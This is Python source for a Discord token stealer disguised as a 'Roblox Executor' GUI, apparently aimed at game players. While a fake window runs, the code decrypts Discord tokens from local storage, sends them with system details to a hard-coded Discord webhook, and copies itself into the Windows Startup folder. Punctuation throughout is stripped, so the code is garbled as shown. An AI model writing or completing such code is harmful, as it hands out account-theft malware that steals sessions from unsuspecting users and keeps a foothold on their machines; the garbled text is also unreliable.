import os
import json
import base64
import sqlite3
import win32crypt
import shutil
import requests
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import AES
from datetime import datetime
import getpass
import platform

# Fake Roblox Executor GUI
def create_fake_gui()
    root = tk.Tk()
    root.title(Roblox Executor)
    root.geometry(400x300)
    root.configure(bg=#2e2e2e)

    label = tk.Label(root, text=Roblox Executor v1.0, font=(Arial, 16), fg=white, bg=#2e2e2e)
    label.pack(pady=20)

    script_input = tk.Text(root, height=5, width=40)
    script_input.pack(pady=10)
    script_input.insert(tk.END, -- Enter your Roblox script here --)

    def fake_execute()
        messagebox.showinfo(Success, Script executed successfully! (This is a fake executor))
    
    execute_button = tk.Button(root, text=Execute Script, command=fake_execute, bg=#4CAF50, fg=white)
    execute_button.pack(pady=10)

    # Run GUI in a separate thread to keep it responsive
    root.mainloop()

# Get Discord token from Local Storage
def get_discord_token()
    try
        discord_path = os.path.join(os.getenv(APPDATA), Discord, Local Storage, leveldb)
        if not os.path.exists(discord_path)
            return None

        # Get encryption key
        local_state_path = os.path.join(os.getenv(APPDATA), Discord, Local State)
        with open(local_state_path, r, encoding=utf-8) as f
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state[os_crypt][encrypted_key])[5]  # Remove 'DPAPI' prefix
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        # Iterate through .ldb files
        tokens = []
        for file_name in os.listdir(discord_path)
            if not file_name.endswith(.ldb)
                continue
            with open(os.path.join(discord_path, file_name), rb) as f
                content = f.read().decode(utf-8, errors=ignore)
                for token in content.split()
                    if len(token)  50 and . in token  # Basic token pattern check
                        try
                            # Decrypt token (simplified, assumes token is in plain or partially encrypted)
                            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=token[-96-84].encode())
                            decrypted_token = cipher.decrypt(base64.b64decode(token[-84])).decode()
                            if decrypted_token.startswith(mfa.) or len(decrypted_token)  20
                                tokens.append(decrypted_token)
                        except
                            continue
        return tokens[0] if tokens else None
    except Exception
        return None

# Get system information
def get_system_info()
    return {
        username getpass.getuser(),
        hostname platform.node(),
        os f{platform.system()} {platform.release()},
        timestamp datetime.now().isoformat()
    }

# Send data to Discord webhook
def send_to_webhook(token, system_info)
    webhook_url = httpsdiscordapp.comapiwebhooks1403893199180660749qI9BX-l9q8bPmUA_T4aQIV7KFuIDJoFVvW4fJFuJqlyFQJnPPr0ClPnrxxshTQTrifaE
    payload = {
        content fNew Token GrabbednToken `{token}`nSystem Info ```jsonn{json.dumps(system_info, indent=2)}n```
    }
    try
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()  # Ensure request was successful
    except
        pass

# Establish persistence
def add_persistence()
    try
        startup_path = os.path.join(os.getenv(APPDATA), Microsoft, Windows, Start Menu, Programs, Startup)
        current_script = os.path.realpath(__file__)
        destination = os.path.join(startup_path, RobloxExecutor.py)
        shutil.copy(current_script, destination)
    except
        pass

# Main function
def main()
    # Start fake GUI in a separate thread
    import threading
    gui_thread = threading.Thread(target=create_fake_gui)
    gui_thread.start()

    # Get token and system info
    token = get_discord_token()
    system_info = get_system_info()

    # Send data if token is found
    if token
        send_to_webhook(token, system_info)

    # Add persistence
    add_persistence()

if __name__ == __main__
    main()